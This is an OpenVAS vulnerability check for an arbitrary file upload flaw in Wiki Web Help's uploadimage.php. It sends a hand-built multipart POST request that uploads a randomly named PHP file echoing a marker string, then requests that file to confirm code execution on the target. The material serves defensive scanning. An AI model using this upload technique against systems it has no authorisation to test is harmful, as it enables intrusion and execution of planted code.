###############################################################################
# OpenVAS Vulnerability Test
#
# Wiki Web Help 'uploadimage.php' Arbitrary File Upload Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100702");
  script_version("2020-10-20T15:03:35+0000");
  script_tag(name:"last_modification", value:"2020-10-20 15:03:35 +0000 (Tue, 20 Oct 2020)");
  script_tag(name:"creation_date", value:"2010-07-06 13:44:35 +0200 (Tue, 06 Jul 2010)");
  script_bugtraq_id(41309);
  script_tag(name:"cvss_base", value:"4.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:S/C:P/I:P/A:P");
  script_name("Wiki Web Help 'uploadimage.php' Arbitrary File Upload Vulnerability");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"solution", value:"The vendor released a patch. Please see the references for more
  information.");

  script_tag(name:"summary", value:"Wiki Web Help is prone to an arbitrary-file-upload vulnerability
  because it fails to properly sanitize user-supplied input.");

  script_tag(name:"impact", value:"An attacker may leverage this issue to upload arbitrary files to the
  affected computer, this can result in arbitrary code execution within
  the context of the vulnerable application.");

  script_tag(name:"affected", value:"Wiki Web Help 0.2.7 is vulnerable, other versions may also be
  affected.");
  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/41309");
  script_xref(name:"URL", value:"http://sourceforge.net/tracker/?func=detail&atid=1296085&aid=3025530&group_id=307693");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("misc_func.inc");

port = http_get_port( default:80 );

if( !http_can_host_php( port:port ) )
  exit( 0 );

vt_strings = get_vt_strings();

foreach dir( make_list_unique( "/wwh", "/wikihelp", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/index.html";
  buf = http_get_cache( item:url, port:port );

  if( buf == NULL )
    continue;

  if( "<title>Wiki Web Help</title>" >< buf ) {

    host = http_host_name( port:port );

    file = vt_strings["default_rand"] + ".php";

    len = 175 + strlen( file );

    req = string(
        "POST ", dir, "/handlers/uploadimage.php HTTP/1.1\r\n",
        "Content-Type: multipart/form-data; boundary=----x\r\n",
        "Host: ", host, "\r\n",
        "Content-Length: ",len,"\r\n",
        "Accept: text/html\r\n",
        "Accept-Encoding: gzip,deflate,sdch\r\n" ,
        "Accept-Language: en-US,en;q=0.8\r\n",
        "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n\r\n",
        "------x\r\n",
        'Content-Disposition: form-data; name="imagefile"; filename="',file,'"',"\r\n",
        "Content-Type: application/octet-stream\r\n\r\n",
        "<?php echo '<pre>", vt_strings["lowercase"], "</pre>'; ?>","\r\n",
        "------x--\r\n\r\n" );
    recv = http_keepalive_send_recv( data:req, port:port, bodyonly:TRUE );

    if( "{'response':'ok'}" >!< recv )
      continue;

    url = string( dir,"/images/",file );

    if( http_vuln_check( port:port, url:url,pattern:vt_strings["lowercase"] ) ) {
      report = string(
        "Note :\n\n",
        "## It was possible to upload and execute a file on the remote webserver.\n",
        "## The file is placed in directory: ", '"', dir, '/images/"', "\n",
        "## and is named: ", '"', file, '"', "\n",
        "## You should delete this file as soon as possible!\n" );
      security_message( port:port,data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
